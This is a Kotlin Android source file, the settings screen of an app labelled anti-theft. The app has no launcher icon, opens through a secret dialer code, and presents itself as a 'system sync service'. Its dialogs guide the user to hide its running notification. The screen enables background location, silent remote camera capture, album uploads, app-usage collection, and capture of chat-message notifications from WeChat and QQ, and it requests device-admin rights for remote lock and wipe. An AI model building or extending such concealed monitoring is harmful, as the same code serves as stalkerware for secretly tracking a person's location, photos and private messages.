package com.example.antitheft

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.text.SpannableStringBuilder
import android.text.Spanned
import android.text.method.LinkMovementMethod
import android.text.style.ClickableSpan
import android.view.View
import android.widget.Toast
import org.json.JSONObject
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.example.antitheft.databinding.ActivitySettingsBinding

/**
 * 唯一的 UI：设置页。桌面无图标，仅 *#*#12345678#*#* / adb 可打开。
 * 负责：注册设备、激活设备管理员、授权权限、跳转厂商保活设置。
 */
class SettingsActivity : AppCompatActivity() {

    private lateinit var binding: ActivitySettingsBinding

    /** 本会话内是否已弹过 overlay 授权引导，避免每次 onResume 都弹 */
    private var overlayPrompted = false

    private val perms: List<String>
        get() {
            val list = mutableListOf(
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.ACCESS_BACKGROUND_LOCATION,
                Manifest.permission.CAMERA,
                Manifest.permission.POST_NOTIFICATIONS
            )
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                list.add(Manifest.permission.READ_MEDIA_IMAGES)
            } else {
                list.add(Manifest.permission.READ_EXTERNAL_STORAGE)
            }
            return list
        }

    private val permLabels = mapOf(
        Manifest.permission.ACCESS_FINE_LOCATION to "定位（精确）",
        Manifest.permission.ACCESS_COARSE_LOCATION to "定位（粗略）",
        Manifest.permission.ACCESS_BACKGROUND_LOCATION to "定位（始终允许 / 后台）",
        Manifest.permission.CAMERA to "相机",
        Manifest.permission.POST_NOTIFICATIONS to "通知",
        Manifest.permission.READ_MEDIA_IMAGES to "相册读取（最近照片）",
        Manifest.permission.READ_EXTERNAL_STORAGE to "相册读取（存储）"
    )

    private val normalPerms: List<String>
        get() {
            val base = mutableListOf(
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.CAMERA,
                Manifest.permission.POST_NOTIFICATIONS
            )
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                base.add(Manifest.permission.READ_MEDIA_IMAGES)
            } else {
                base.add(Manifest.permission.READ_EXTERNAL_STORAGE)
            }
            return base
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivitySettingsBinding.inflate(layoutInflater)
        setContentView(binding.root)

        binding.btnRegister.setOnClickListener { doRegister() }
        binding.btnAdmin.setOnClickListener { requestAdmin() }
        binding.btnPerms.setOnClickListener { requestAllNormalPerms() }
        binding.btnCompat.setOnClickListener { openCompat() }
        binding.btnDebugPhoto.setOnClickListener { testPhoto() }
        binding.btnDebugAlbum.setOnClickListener { testAlbum() }
        binding.btnUsagePerm.setOnClickListener { UsageCollector.openUsageSettings(this) }
        binding.btnDebugUsage.setOnClickListener { testUsage() }
        binding.btnHideNotif.setOnClickListener { openNotifChannelSettings() }

        // 高精度定位模式开关
        binding.swHighPrecision.isChecked = Prefs.getHighPrecision(this)
        binding.swHighPrecision.setOnCheckedChangeListener { _, isChecked ->
            Prefs.setHighPrecision(this, isChecked)
            Toast.makeText(this, if (isChecked) "高精度模式：已开启（强制 GPS）" else "快速模式：已开启（网络优先）", Toast.LENGTH_SHORT).show()
        }
    }

    private fun openNotifChannelSettings() {
        // 前台服务通知 Android 强制显示，唯一彻底隐藏方式是用户在系统设置里
        // 关闭该通知渠道。关闭后服务照常运行，仅通知不显示。
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val intent = Intent(Settings.ACTION_CHANNEL_NOTIFICATION_SETTINGS).apply {
                putExtra(Settings.EXTRA_APP_PACKAGE, packageName)
                putExtra(Settings.EXTRA_CHANNEL_ID, C.NOTIF_CHANNEL_ID)
            }
            try {
                startActivity(intent)
                Toast.makeText(this, "找到「${C.NOTIF_CHANNEL_NAME}」并关闭即可隐藏运行通知", Toast.LENGTH_LONG).show()
                return
            } catch (_: Exception) { }
        }
        // 回退：跳应用通知总设置
        try {
            startActivity(Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS).apply {
                putExtra(Settings.EXTRA_APP_PACKAGE, packageName)
            })
        } catch (_: Exception) {
            openAppDetails()
        }
    }

    private fun testPhoto() {
        // 调试入口：在 Activity 前台直接触发拍照上传，绕过 15 分钟轮询
        AntiTheftService.requestPhoto(this, null)
        Toast.makeText(this, "已触发拍照，5-10 秒后看控制台照片区", Toast.LENGTH_SHORT).show()
    }

    private fun testAlbum() {
        // 调试入口：直接触发相册上传（最近 10 张），绕过 15 分钟轮询
        AntiTheftService.requestAlbum(this, JSONObject().apply { put("n", 10) })
        Toast.makeText(this, "已触发上传最近 10 张，稍后看控制台相册区", Toast.LENGTH_SHORT).show()
    }

    private fun testUsage() {
        // 调试入口：直接触发应用使用数据上传，绕过 15 分钟轮询
        if (!UsageCollector.hasUsagePermission(this)) {
            Toast.makeText(this, "尚未授权「使用情况访问」，先点上方按钮授权", Toast.LENGTH_LONG).show()
            UsageCollector.openUsageSettings(this)
            return
        }
        AntiTheftService.requestUsage(this)
        Toast.makeText(this, "已触发上传应用使用数据，稍后看控制台「应用使用情况」页", Toast.LENGTH_SHORT).show()
    }

    override fun onResume() {
        super.onResume()
        refreshStatus()
        // 远程拍照必需：进入本页若未授予「显示在其他应用上」，自动引导一次
        if (!overlayPrompted && !hasOverlayPermission()) {
            overlayPrompted = true
            requestOverlayPermission()
        }
    }

    private fun refreshStatus() {
        val id = Prefs.getDeviceId(this)
        if (id != null) {
            binding.tvDeviceInfo.text = "已注册 device_id: $id"
            binding.btnRegister.isEnabled = false
        } else {
            binding.tvDeviceInfo.text = "未注册"
            binding.btnRegister.isEnabled = true
        }
        val g = ManufacturerCompat.detect(this)
        binding.tvCompat.text = "厂商：${g.title}\n\n${g.steps}"
        binding.tvSecretHint.text = "拨号盘输入 *#*#${C.SECRET_CODE}#*#* 可再次打开本页\n下拉通知栏点“同步”瓷砖也可打开本页"
        refreshPermsStatus()
    }

    private fun doRegister() {
        Thread {
            val model = "${Build.BRAND} ${Build.MODEL}"
            val reg = RelayApi.register(model)
            runOnUiThread {
                if (reg != null) {
                    Prefs.saveDevice(this, reg.deviceId, reg.token, model)
                    PollWorker.schedule(this)
                    KeepAliveService.start(this)
                    ChargeResumeWorker.schedule(this)
                    Toast.makeText(this, "注册成功", Toast.LENGTH_SHORT).show()
                    refreshStatus()
                } else {
                    Toast.makeText(this, "注册失败，检查网络/中继", Toast.LENGTH_LONG).show()
                }
            }
        }.start()
    }

    private fun requestAdmin() {
        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val cn = ComponentName(this, AntiTheftDeviceAdmin::class.java)
        if (dpm.isAdminActive(cn)) {
            Toast.makeText(this, "设备管理员已激活", Toast.LENGTH_SHORT).show()
            return
        }
        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
            putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn)
            putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "用于远程锁屏与擦除")
        }
        startActivityForResult(intent, 1)
    }

    private fun hasPerm(perm: String): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU && perm == Manifest.permission.POST_NOTIFICATIONS) return true
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU && (perm == Manifest.permission.READ_MEDIA_IMAGES || perm == Manifest.permission.READ_EXTERNAL_STORAGE)) return true
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q && perm == Manifest.permission.ACCESS_BACKGROUND_LOCATION) return true
        return ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED
    }

    private fun refreshPermsStatus() {
        val sb = SpannableStringBuilder()
        sb.append("权限状态（点击未授予项处理）：\n")
        for (perm in perms) {
            val granted = hasPerm(perm)
            val label = permLabels[perm] ?: perm
            val line = if (granted) "● $label：已授予\n" else "○ $label：未授予 → 点击设置\n"
            val start = sb.length
            sb.append(line)
            val end = sb.length
            if (!granted) {
                sb.setSpan(object : ClickableSpan() {
                    override fun onClick(widget: View) {
                        onPermClick(perm)
                    }
                }, start, end, Spanned.SPAN_EXCLUSIVE_EXCLUSIVE)
            }
        }
        // 应用使用统计：特殊权限（无法运行时申请），单独一行展示并引导
        val usageGranted = UsageCollector.hasUsagePermission(this)
        val uStart = sb.length
        if (usageGranted) {
            sb.append("● 使用情况访问（应用分析）：已授予\n")
        } else {
            sb.append("○ 使用情况访问（应用分析）：未授予 → 点击设置\n")
        }
        val uEnd = sb.length
        sb.setSpan(object : ClickableSpan() {
            override fun onClick(widget: View) {
                UsageCollector.openUsageSettings(this@SettingsActivity)
            }
        }, uStart, uEnd, Spanned.SPAN_EXCLUSIVE_EXCLUSIVE)

        // 电池优化：决定是否允许后台运行 / WorkManager 是否会被冻死
        val batteryOptGranted = BatteryUtil.isIgnoringBatteryOptimizations(this)
        val bStart = sb.length
        if (batteryOptGranted) {
            sb.append("● 忽略电池优化（后台运行/防冻结）：已允许\n")
        } else {
            sb.append("○ 忽略电池优化（后台运行/防冻结）：未允许 → 点击设置（强烈建议）\n")
        }
        val bEnd = sb.length
        sb.setSpan(object : ClickableSpan() {
            override fun onClick(widget: View) {
                requestBatteryOpt()
            }
        }, bStart, bEnd, Spanned.SPAN_EXCLUSIVE_EXCLUSIVE)

        // 通知监听：捕获系统通知（含聊天预览），用于线索留痕
        val notifyOn = NotifyListenerService.isEnabled(this)
        val nStart = sb.length
        if (notifyOn) {
            sb.append("● 通知监听（聊天线索留痕）：已开启\n")
        } else {
            sb.append("○ 通知监听（聊天线索留痕）：未开启 → 点击设置\n")
        }
        val nEnd = sb.length
        sb.setSpan(object : ClickableSpan() {
            override fun onClick(widget: View) {
                requestNotifyListener()
            }
        }, nStart, nEnd, Spanned.SPAN_EXCLUSIVE_EXCLUSIVE)

        // 显示在其他应用上：Android 官方后台启动 Activity 豁免项，远程拍照必需
        val overlayGranted = hasOverlayPermission()
        val oStart = sb.length
        if (overlayGranted) {
            sb.append("● 显示在其他应用上（后台拍照必需）：已授予\n")
        } else {
            sb.append("○ 显示在其他应用上（后台拍照必需）：未授予 → 点击设置（强烈建议）\n")
        }
        val oEnd = sb.length
        sb.setSpan(object : ClickableSpan() {
            override fun onClick(widget: View) {
                requestOverlayPermission()
            }
        }, oStart, oEnd, Spanned.SPAN_EXCLUSIVE_EXCLUSIVE)

        binding.tvPermsStatus.text = sb
        binding.tvPermsStatus.movementMethod = LinkMovementMethod.getInstance()
    }

    private fun requestBatteryOpt() {
        if (BatteryUtil.isIgnoringBatteryOptimizations(this)) {
            Toast.makeText(this, "已忽略电池优化", Toast.LENGTH_SHORT).show()
            refreshPermsStatus()
            return
        }
        // 小米 / 红米 / HyperOS：标准弹窗会跳到没用的「电量详情」页，
        // 且该页面对无桌面图标的本应用不显示「无限制」选项，必须去「应用智能省电」总列表设置。
        if (BatteryUtil.isXiaomi()) {
            AlertDialog.Builder(this)
                .setTitle("小米/红米：电量详情无效，请去应用智能省电")
                .setMessage(
                    "HyperOS 把本应用归为无图标应用，所以「电量详情」页不显示「无限制」选项。必须按下面操作：\n\n" +
                    "① 设置 → 省电与电池 → 右上角设置/更多 → 应用智能省电 → 找到「系统同步服务」→ 选「无限制」\n" +
                    "② 设置 → 应用设置 → 授权管理 → 自启动管理 → 允许本应用\n" +
                    "③ 多任务卡片下拉本应用加锁，防止被一键清理\n\n" +
                    "点下方按钮尝试直达对应设置页。"
                )
                .setPositiveButton("应用智能省电") { _, _ ->
                    if (!BatteryUtil.openMiuiPowerSaveList(this)) {
                        Toast.makeText(this, "未找到该入口，请按上方路径手动进设置", Toast.LENGTH_LONG).show()
                    }
                }
                .setNeutralButton("自启动管理") { _, _ ->
                    if (!BatteryUtil.openMiuiAutoStart(this)) {
                        Toast.makeText(this, "未找到自启动入口，请按上方路径手动进设置", Toast.LENGTH_LONG).show()
                    }
                }
                .setNegativeButton("关闭", null)
                .show()
            return
        }
        // 其他 ROM：尝试标准弹窗，失败回退应用详情页
        try {
            startActivityForResult(BatteryUtil.requestIgnoreIntent(this), 3)
        } catch (_: Exception) {
            openAppDetails()
        }
    }

    private fun requestNotifyListener() {
        if (NotifyListenerService.isEnabled(this)) {
            Toast.makeText(this, "通知监听已开启", Toast.LENGTH_SHORT).show()
            refreshPermsStatus()
            return
        }
        AlertDialog.Builder(this)
            .setTitle("开启通知监听（聊天线索留痕）")
            .setMessage(
                "本功能捕获系统通知栏出现的通知（含微信/QQ 等聊天预览），即时上传到控制台作为防盗线索。\n\n" +
                "请在「通知使用权」列表里找到「系统同步服务」并开启。\n" +
                "说明：只能拿到通知栏展示的内容（发件人+预览文本），拿不到历史/图片/语音；" +
                "小偷点进聊天页后继续聊（不弹通知）则监听不到，需无障碍读屏才能补（本版本未做）。\n\n" +
                "点下方按钮跳转到通知使用权设置页。"
            )
            .setPositiveButton("去通知使用权") { _, _ ->
                try {
                    startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
                } catch (_: Exception) {
                    openAppDetails()
                }
            }
            .setNegativeButton("关闭", null)
            .show()
    }

    /**
     * 显示在其他应用上（悬浮窗）：Android 官方后台启动 Activity 豁免项。
     * 远程拍照需要从后台弹出透明 Activity，Android 10+ 默认禁止，
     * 授予此权限后系统即豁免，后台也能弹窗拍照。
     */
    private fun hasOverlayPermission(): Boolean {
        return Settings.canDrawOverlays(this)
    }

    private fun requestOverlayPermission() {
        if (hasOverlayPermission()) {
            Toast.makeText(this, "已授予「显示在其他应用上」", Toast.LENGTH_SHORT).show()
            refreshPermsStatus()
            return
        }
        AlertDialog.Builder(this)
            .setTitle("开启「显示在其他应用上」（远程拍照必需）")
            .setMessage(
                "本应用远程拍照需要在后台弹出透明拍照界面。Android 10+ 默认禁止后台弹 Activity，" +
                "授予「显示在其他应用上」（悬浮窗）权限后，系统即豁免此限制，后台也能弹窗拍照。\n\n" +
                "请在设置页找到「系统同步服务」并开启开关，然后返回本页。"
            )
            .setPositiveButton("去授权") { _, _ ->
                try {
                    startActivityForResult(
                        Intent(
                            Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                            Uri.parse("package:$packageName")
                        ), 4
                    )
                } catch (_: Exception) {
                    openAppDetails()
                }
            }
            .setNegativeButton("关闭", null)
            .show()
    }

    private fun onPermClick(perm: String) {
        if (perm == Manifest.permission.ACCESS_BACKGROUND_LOCATION) {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
                openAppDetails()
                return
            }
            if (!hasPerm(Manifest.permission.ACCESS_FINE_LOCATION) &&
                !hasPerm(Manifest.permission.ACCESS_COARSE_LOCATION)) {
                Toast.makeText(this, "请先授予“使用期间允许”定位权限", Toast.LENGTH_SHORT).show()
                requestPerms(arrayOf(
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION
                ))
                return
            }
        }
        requestPerms(arrayOf(perm))
    }

    private fun requestAllNormalPerms() {
        val need = normalPerms.filter { !hasPerm(it) }.toTypedArray()
        if (need.isEmpty()) {
            Toast.makeText(this, "普通权限已齐全，如仍缺“始终允许”定位请点下方对应行", Toast.LENGTH_LONG).show()
            refreshPermsStatus()
            return
        }
        ActivityCompat.requestPermissions(this, need, 2)
    }

    private fun requestPerms(perms: Array<String>) {
        ActivityCompat.requestPermissions(this, perms, 2)
    }

    private fun openAppDetails() {
        startActivity(
            Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.fromParts("package", packageName, null)
            }
        )
    }

    private fun openCompat() {
        val g = ManufacturerCompat.detect(this)
        if (g.actions.size <= 1) {
            g.actions.firstOrNull()?.let { launchCompat(it) }
            return
        }
        val labels = g.actions.map { it.label }.toTypedArray()
        AlertDialog.Builder(this)
            .setTitle(g.title + " · 厂商保活设置")
            .setMessage(g.steps)
            .setItems(labels) { _, which -> launchCompat(g.actions[which]) }
            .setPositiveButton("关闭", null)
            .show()
    }

    private fun launchCompat(a: ManufacturerCompat.CompatAction) {
        val intent = a.intent
        if (intent == null) {
            Toast.makeText(this, "此项需手动操作，请按上方引导文案在系统设置中完成", Toast.LENGTH_LONG).show()
            return
        }
        try {
            startActivity(intent)
        } catch (e: Exception) {
            // 专用跳转失败 -> 回退通用应用详情页
            startActivity(
                Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                    data = Uri.fromParts("package", packageName, null)
                }
            )
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int, permissions: Array<out String>, grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode != 2) return
        val denied = permissions.zip(grantResults.toList())
            .filter { it.second != PackageManager.PERMISSION_GRANTED }
            .map { it.first }
        if (denied.isEmpty()) {
            Toast.makeText(this, "权限已授予", Toast.LENGTH_SHORT).show()
        } else {
            val neverAsk = denied.filter {
                !ActivityCompat.shouldShowRequestPermissionRationale(this, it)
            }
            if (neverAsk.isNotEmpty()) {
                Toast.makeText(this, "部分权限被禁止且不再询问，已跳转到应用设置", Toast.LENGTH_LONG).show()
                openAppDetails()
            } else {
                Toast.makeText(this, "仍有权限未授予，可点击权限列表逐条处理", Toast.LENGTH_LONG).show()
            }
        }
        refreshPermsStatus()
    }

    @Deprecated("Deprecated in Java")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == 1) refreshStatus()
        if (requestCode == 3) refreshPermsStatus()
        if (requestCode == 4) refreshPermsStatus()
    }
}
